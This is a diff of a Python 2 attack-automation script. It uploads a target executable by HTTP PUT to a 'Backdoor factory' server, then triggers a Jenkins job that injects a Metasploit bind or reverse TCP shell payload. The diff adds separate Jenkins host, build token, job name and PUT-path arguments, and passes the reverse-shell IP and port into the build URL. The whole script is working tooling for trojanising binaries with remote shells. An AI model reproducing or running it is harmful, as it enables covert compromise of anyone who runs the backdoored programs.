@@ -9,21 +9,30 @@ import urllib2
 # configure
 parser = argparse.ArgumentParser()
 parser.add_argument('b', help='full path to target binary')
-parser.add_argument('s', help='Jenkins/backdoor factory server name or IP, e.g. some.domain.com or 1.2.3.4')
+parser.add_argument('s', help='Backdoor factory server name or IP, e.g. some.domain.com or 1.2.3.4')
+parser.add_argument('p', help='PUT php file path')
+parser.add_argument('j', help='Jenkins server name or IP, e.g. some.domain.com or 1.2.3.4:8080')
+parser.add_argument('k', help='Jenkin build key')
+parser.add_argument('n', help='Jenkin build job name')
 parser.add_argument('o', help='OS type: 0 = Linux/x86, 1 = Windows/x86', type=int)
 parser.add_argument('pay', help='payload type: 0 = MSF TCP Bind (requires -port), 1 = MSF TCP Reverse (requires -rip & -port)', type=int)
 parser.add_argument('port', help='MSF TCP Bind/Reverse Shell Port Number', type=int)
-parser.add_argument('-rip', help='MSF TCP reverse payload IP address')
+parser.add_argument('rip', help='MSF TCP reverse payload IP address')
 
 args = parser.parse_args()
 
 binaryPath = args.b
+jenkinsIP = 'http://' + args.j
 hostIP = 'http://' + args.s
 indir = '/in/'
 outdir = '/out/'
+putfn = args.p
 osType = args.o
+jenkins_bn = args.n
+jenkins_key = args.k
 payloadType = args.pay
 payloadPort = args.port
+payloadIP = args.rip
 if args.pay == 1:
     if not args.rip:
         print '-rip parameter required when using MSF TCP Reverse Shell Payload'
@@ -62,14 +71,27 @@ print '[*]uploading ' + uploadFileName
 # read file
 fileData = file(binaryPath).read()
 
+# Make a upload file name
+uploadDir = indir + uploadFileName
 # put file
-uploadURL = hostIP + indir + uploadFileName
-'[*] PUT file...' + uploadURL
+uploadURL = hostIP + '/' + putfn + uploadDir
+
+print '[*] PUT file ' + uploadURL
 req = MethodRequest(url=uploadURL, method='PUT', data=fileData)
 res = urllib2.urlopen(req)
 
+
+"""Use the following URL to trigger build remotely: JENKINS_URL/job/test_proj1/build?token=TOKEN_NAME or /buildWithParameters?token=TOKEN_NAME
+Optionally append &cause=Cause+Text to provide text that will be included in the recorded build cause."""
+
 # trigger Jenkins job
-if res.getcode() == 201:
+bulid_prams = '/job/' + jenkins_bn + '/buildWithParameters?token=' + jenkins_key + '&delay=0' +'&dir=' + uploadFileName  + '&Payload_Type=' + str(payloadType) + '&port=' + str(payloadPort) + '&IP=' +  payloadIP + '&binName=' + fileLocation + fileName
+jenkins_url = jenkinsIP + bulid_prams
+print '[*] Jenkins URL ' + jenkins_url
+
+#req = MethodRequest(
+req2 = urllib2.urlopen(jenkins_url)
+if req2.getcode() == 201:
     print '[*] SUCCESS'
     # call URL with params
 
